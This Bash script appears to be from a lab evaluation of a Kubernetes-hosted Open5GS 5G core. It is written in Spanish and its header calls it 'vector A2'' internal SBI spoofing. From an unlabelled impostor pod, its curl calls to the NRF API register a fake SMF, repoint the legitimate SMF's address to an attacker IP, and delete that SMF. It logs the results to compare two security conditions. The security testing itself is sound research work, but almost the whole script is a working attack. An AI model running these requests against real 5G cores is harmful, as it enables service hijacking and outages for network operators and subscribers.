#!/bin/bash
# run_a2p_sbi_spoofing_internal.sh
# Vector A2' -- SBI spoofing interno sin identidad de workload.
# Pod nf-impostor (sin label cib46-nf-type=core-nf) ejecuta las cuatro
# operaciones CRUD desde DENTRO del namespace 5g-cp. Valida HE3
# (C1 vs C2).
#
# Ejecutar desde el nodo master.

set -uo pipefail

CONDICION="${1:?Uso: run_a2p_sbi_spoofing_internal.sh <C1|C2>}"
SMF_UUID="${SMF_UUID:?Definir SMF_UUID con el nfInstanceId legitimo del SMF}"
IMP=nf-impostor
NRF_SVC=open5gs-cp-nrf-sbi.5g-cp.svc.cluster.local
LOG="a2p_${CONDICION}.txt"

echo "=== A2' -- Condicion: ${CONDICION} | $(date -u) ===" | tee "$LOG"

echo "--- READ ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$IMP" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- CREATE (PUT NF impostora) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$IMP" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X PUT \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/ffffffff-dead-beef-cafe-000000000099 \
  -H 'Content-Type: application/json' \
  -d '{\"nfInstanceId\":\"ffffffff-dead-beef-cafe-000000000099\",
       \"nfType\":\"SMF\",\"nfStatus\":\"REGISTERED\",
       \"ipv4Addresses\":[\"10.244.99.99\"]}' \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- UPDATE (PATCH secuestro) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$IMP" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X PATCH \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/${SMF_UUID} \
  -H 'Content-Type: application/json-patch+json' \
  -d '[{\"op\":\"replace\",\"path\":\"/ipv4Addresses/0\",\"value\":\"10.244.99.99\"}]' \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- DELETE ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$IMP" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X DELETE \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/${SMF_UUID} \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "Timestamp cierre A2' ${CONDICION}: $(date -u)" | tee -a "$LOG"
